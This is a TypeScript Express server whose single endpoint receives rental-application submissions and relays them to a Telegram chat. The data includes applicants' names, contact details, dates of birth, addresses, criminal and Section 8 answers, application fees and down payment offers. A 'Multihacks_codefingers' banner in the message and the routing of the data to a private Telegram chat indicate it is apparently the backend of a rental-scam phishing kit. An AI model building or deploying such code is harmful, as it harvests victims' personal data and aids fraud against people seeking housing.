import express, { Request, Response } from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const port = process.env.PORT || 3001;

// Telegram Configuration
const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

if (!token || !chatId) {
  console.warn('TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not provided in .env');
}

const bot = token ? new TelegramBot(token, { polling: false }) : null;

app.use(cors());
app.use(bodyParser.json());

app.post('/api/submit-application', async (req: Request, res: Response) => {
  try {
    const data = req.body;
    console.log('Received application for:', data.firstName, data.lastName);

    if (bot && chatId) {
      console.log('Attempting to send Telegram message to chat:', chatId);
      const message = formatTelegramMessage(data);
      const result = await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
      console.log('Telegram message sent successfully. Message ID:', result.message_id);
    } else {
      console.warn('Telegram bot or chat ID not initialized. Bot:', !!bot, 'ChatID:', !!chatId);
    }

    res.status(200).json({ success: true, message: 'Application submitted successfully' });
  } catch (error) {
    console.error('Error in /api/submit-application:', error);
    res.status(500).json({ success: false, message: 'Failed to submit application' });
  }
});

function formatTelegramMessage(data: any): string {
  const { firstName, lastName, email, phone, proposedOccupants, dob, leaseLength, occupation, addressLine1, city, state, zipCode, hasPets, worksAtNight, smokes, isFelon, isSection8, everConvicted, rent, securityDeposit, appFee, appFeeMethod, petFee, properties, downPaymentAmount } = data;

  let msg = `<b>&lt;----------New registration-----------&gt; from---&gt;Multihacks_codefingers---&gt;</b>\n\n`;
  msg += `👤 <b>Applicant:</b> ${firstName} ${lastName}\n`;
  msg += `📧 <b>Email:</b> ${email}\n`;
  msg += `📞 <b>Phone:</b> ${phone}\n`;
  msg += `🎂 <b>DOB:</b> ${dob}\n`;
  msg += `👥 <b>Occupants:</b> ${proposedOccupants}\n`;
  msg += `💼 <b>Occupation:</b> ${occupation}\n`;
  msg += `⏳ <b>Lease Length:</b> ${leaseLength}\n\n`;

  msg += `📍 <b>Current Address:</b> ${addressLine1}, ${city}, ${state} ${zipCode}\n\n`;

  msg += `❓ <b>Questions:</b>\n`;
  msg += `- Pets: ${hasPets ? '✅ Yes' : '❌ No'}\n`;
  msg += `- Night Work: ${worksAtNight ? '✅ Yes' : '❌ No'}\n`;
  msg += `- Smoker: ${smokes ? '✅ Yes' : '❌ No'}\n`;
  msg += `- Felon: ${isFelon ? '✅ Yes' : '❌ No'}\n`;
  msg += `- Section 8: ${isSection8 ? '✅ Yes' : '❌ No'}\n`;
  msg += `- Convicted: ${everConvicted ? '✅ Yes' : '❌ No'}\n\n`;

  msg += `💰 <b>Financials:</b>\n`;
  msg += `- Rent: $${rent}\n`;
  msg += `- Deposit: $${securityDeposit}\n`;
  msg += `- App Fee: $${appFee} (${appFeeMethod})\n`;
  msg += `- Pet Fee: $${petFee}\n\n`;

  if (properties && properties.length > 0) {
    msg += `🏦 <b>Property Interest:</b>\n`;
    properties.forEach((p: any, i: number) => {
      msg += `${i + 1}. ${p.type} - ${p.address.streetNumber} ${p.address.streetName}, ${p.address.city}, ${p.address.state} ${p.address.zipCode}\n`;
    });
    msg += `\n`;
  }

  msg += `💵 <b>Down Payment Offer:</b> ${downPaymentAmount}\n`;

  return msg;
}

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
